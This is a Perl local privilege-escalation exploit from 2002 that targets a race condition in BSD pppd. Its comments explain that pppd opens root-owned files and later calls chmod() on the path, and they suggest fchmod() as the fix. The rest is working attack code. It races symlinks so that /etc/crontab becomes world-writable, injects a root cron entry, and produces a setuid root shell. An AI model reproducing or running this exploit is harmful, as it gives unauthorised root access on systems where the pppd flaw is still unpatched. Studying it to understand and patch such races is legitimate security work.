#!/usr/bin/perl

# Local root exploit for AnyBSD. Tested on my 4.3 FBSD homebox.
#
# (C) 2002 Sebastian Krahmer -- stealth at segfault dot net ;-))
#
# NOT for abuse but for educational purposes only.
#
# Exploit description:
#
# The BSD pppd allows users to open any file even if its root owned.
# It then tries to set apropriate terminal attributes on the filedescriptor
# if a connection-script is given. As if it isn't bad enough that it allows
# you to open roots console for example it also has a race: If the tcgetattr()
# fails it calls some cleanup routines which use chown() to restore the mode
# of the terminal (at least it ASSUMES it is an terminal). It should rather use
# the tty_fd to restore the mode because between open() and tcgetattr failure+chown()
# we link the file to /etc/crontab which will then have the mode of the former file
# (which is probably 0666 :)

# Some code snippets.
#
# The vulnerable open():
# ...
#        /*
#         * Open the serial device and set it up to be the ppp interface.
#         * First we open it in non-blocking mode so we can set the
#         * various termios flags appropriately.  If we aren't dialling
#         * out and we want to use the modem lines, we reopen it later
#         * in order to wait for the carrier detect signal from the modem.
#         */
#       while ((ttyfd = open(devnam, O_NONBLOCK | O_RDWR, 0)) < 0) {
#            if (errno != EINTR)
#                syslog(LOG_ERR, "Failed to open %s: %m", devnam);
#            if (!persist || errno != EINTR)
#                goto fail;
#       }
# ...
# close_tty() which is called during cleanup because tcgetattr() of
# the fd will fail:
#
# static void
# close_tty()
# {
#    disestablish_ppp(ttyfd);
#
#   /* drop dtr to hang up */
#    if (modem) {
#        setdtr(ttyfd, FALSE);
#        /*
#         * This sleep is in case the serial port has CLOCAL set by default,
#         * and consequently will reassert DTR when we close the device.
#         */
#        sleep(1);
#    }
#
#    restore_tty(ttyfd);
#
#    if (tty_mode != (mode_t) -1)
#        chmod(devnam, tty_mode);
#
#    close(ttyfd);
#    ttyfd = -1;
# }
#
# The chmod() bangs.
# Fix suggestion: use fchmod() instead of chmod() and do not allow
# users to open root owned files.



# ok, standard init ...
umask 0;

chdir("$ENV{HOME}");
system("cp /etc/crontab /tmp/crontab");

# create evil .ppprc to catch right execution path in pppd
open O, ">.ppprc" or die $!;
print O "/dev/../tmp/ppp-device\n".
        "connect /tmp/none\n";

close O;

print "Starting ... You can safely ignore any error messages and lay back. It can take some\n".
      "minutes...\n\n";

# create a boomsh to be made +s
create_boomsh();
 
# fork off a proc which constantly creates a mode 0666
# file and a link to /etc/crontab. crontab file will "inherit"
# the mode then
if (fork() == 0) {
	play_tricks("/tmp/ppp-device");
}


# fork off own proc which inserts command into crontab file
# which is then executed as root
if (fork() == 0) {
	watch_crontab();
}

my $child;

# start pppd until race succeeds!
for (;;) {
	if (($child = fork()) == 0) {
		exec ("/usr/sbin/pppd");

	}
	wait;
	last if (((stat("/tmp/boomsh"))[2] & 04000) == 04000);
}

# ok, we have a lot of interpreters running due to fork()'s
# so kill them...
if (fork() == 0) {
	sleep(3);
	system("killall -9 perl");
}

# thats all folks! ;-)
exec("/tmp/boomsh");


###

sub create_boomsh
{
	open O, ">/tmp/boomsh.c" or die $!;
	print O "int main() { char *a[]={\"/bin/sh\", 0}; setuid(0); ".
	        "system(\"cp /tmp/crontab /etc/crontab\"); execve(*a,a,0); return 1;}\n";
	close O;
	system("cc /tmp/boomsh.c -o /tmp/boomsh");
}

sub play_tricks
{
	my $file = shift;
	for (;;) {
		unlink($file);
		open O, ">$file";
		close O;

		# On the OpenBSD box of a friend 0.01 as fixed value
		# did the trick. on my FreeBSD box 0.1 did.
		# maybe you need to play here
		select undef, undef, undef, rand 0.3;
		unlink($file);
		symlink("/etc/crontab", $file);
	}
}

sub watch_crontab
{
	for (;;) {
		open O, ">>/etc/crontab" or next;
		print "Race succeeded! Waiting for cron ...\n";
		print O "\n* * * * * root chown root /tmp/boomsh;chmod 04755 /tmp/boomsh\n"; 
		close O;
		last;
	}
	exit;	
}
